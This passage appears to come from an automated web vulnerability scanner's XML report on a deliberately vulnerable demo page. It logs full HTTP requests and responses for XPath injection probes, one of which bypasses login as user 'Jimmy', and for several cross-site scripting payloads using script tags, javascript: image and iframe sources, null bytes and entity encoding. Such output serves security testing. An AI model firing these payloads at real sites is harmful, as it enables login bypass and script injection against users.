&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either "'&gt;&lt;IMG SRC="/WF_XSRF.html"&gt; or 
	&lt;/body&gt;
&lt;/html&gt;


GET /WF_XSRF.html HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/XPathInjection2.php


HTTP/1.1 404 Not Found
Content-Length: 210
Date: Mon, 14 Jul 2014 14:47:27 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /WF_XSRF.html was not found on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attBlindSqlInjectionStrings" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="password" Type="Parameter" />
        <Variant ID="12495">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%27+and+%27foobar%27%3D%27foobar</Difference>
          <Reasoning>This test appends a selection of conditions to the parameter value, to verify that it is embedded in an SQL query at the back-end. Three (or four) test requests are sent: the last is logically equal to the original, and the next-to-last is different (the others are for control purposes). A comparison of the last two test responses with the original confirms that the appended values were indeed added to an SQL query.</Reasoning>
          <ValidationDataLocationAtTestResponse />
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 51
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+and+%27foobar%27%3D%27foobar
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;


POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 51
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+and+%27barfoo%27%3D%27foobar
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;


POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 50
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+or+%27foobar%27%3D%27foobar
HTTP/1.1 200 OK
Content-Length: 227
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	You have logged in as Jimmy with id 1.
	&lt;/body&gt;
&lt;/html&gt;


POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 50
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+or+%27barfoo%27%3D%27foobar
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;


================================================================================

POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 51
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+and+%27barfoo%27%3D%27foobar
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;


================================================================================

POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 50
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+or+%27foobar%27%3D%27foobar
HTTP/1.1 200 OK
Content-Length: 227
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	You have logged in as Jimmy with id 1.
	&lt;/body&gt;
&lt;/html&gt;


================================================================================

POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 50
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+or+%27barfoo%27%3D%27foobar
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12498">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%27+%2B+%27%27+%2B+%27</Difference>
          <Reasoning>This test appends a selection of conditions to the parameter value, to verify that it is embedded in an SQL query at the back-end. Three (or four) test requests are sent: the last is logically equal to the original, and the next-to-last is different (the others are for control purposes). A comparison of the last two test responses with the original confirms that the appended values were indeed added to an SQL query.</Reasoning>
          <ValidationDataLocationAtTestResponse />
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+%2B+%27%27+%2B+%27
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;


POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 38
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+%2B+%27+%2B+%27
HTTP/1.1 200 OK
Content-Length: 540
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or ' + ' + '
	&lt;/body&gt;
&lt;/html&gt;


POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+%2B+%27%27+%2B+%27
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;


================================================================================

POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 38
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+%2B+%27+%2B+%27
HTTP/1.1 200 OK
Content-Length: 540
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or ' + ' + '
	&lt;/body&gt;
&lt;/html&gt;


================================================================================

POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 41
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27+%2B+%27%27+%2B+%27
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:52:16 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attCrossSiteScripting" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="password" Type="Parameter" />
        <Variant ID="12500">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(25424)%22&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1065" Length="12" String="alert(25424)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 70
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(25424)%22&gt;
HTTP/1.1 200 OK
Content-Length: 571
Date: Mon, 14 Jul 2014 14:47:27 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or &gt;"'&gt;&lt;img src="javascript:alert(25424)"&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12501">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(25426)&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1209" Length="12" String="alert(25426)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 159
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(25426)&gt;
HTTP/1.1 200 OK
Content-Length: 624
Date: Mon, 14 Jul 2014 14:47:27 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or &gt;"'&gt;&lt;img src=&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;alert(25426)&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12504">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=&gt;'&gt;&lt;script&gt;alert(25432)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1032" Length="12" String="alert(25432)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 51
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=&gt;'&gt;&lt;script&gt;alert(25432)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 564
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or &gt;'&gt;&lt;script&gt;alert(25432)&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12506">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=&gt;'&gt;&lt;%00script&gt;alert(25436)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1036" Length="12" String="alert(25436)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 54
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=&gt;'&gt;&lt;%00script&gt;alert(25436)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 565
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or &gt;'&gt;&lt; script&gt;alert(25436)&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12507">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=&gt;"&gt;&lt;%00script&gt;alert(25438)&lt;/script&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1036" Length="12" String="alert(25438)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 54
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=&gt;"&gt;&lt;%00script&gt;alert(25438)&lt;/script&gt;
HTTP/1.1 200 OK
Content-Length: 565
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Unfinished literal in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or &gt;"&gt;&lt; script&gt;alert(25438)&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12512">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2825448%29%3E</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1071" Length="12" String="alert(25448)" />
          </ValidationDataLocationAtTestResponse>
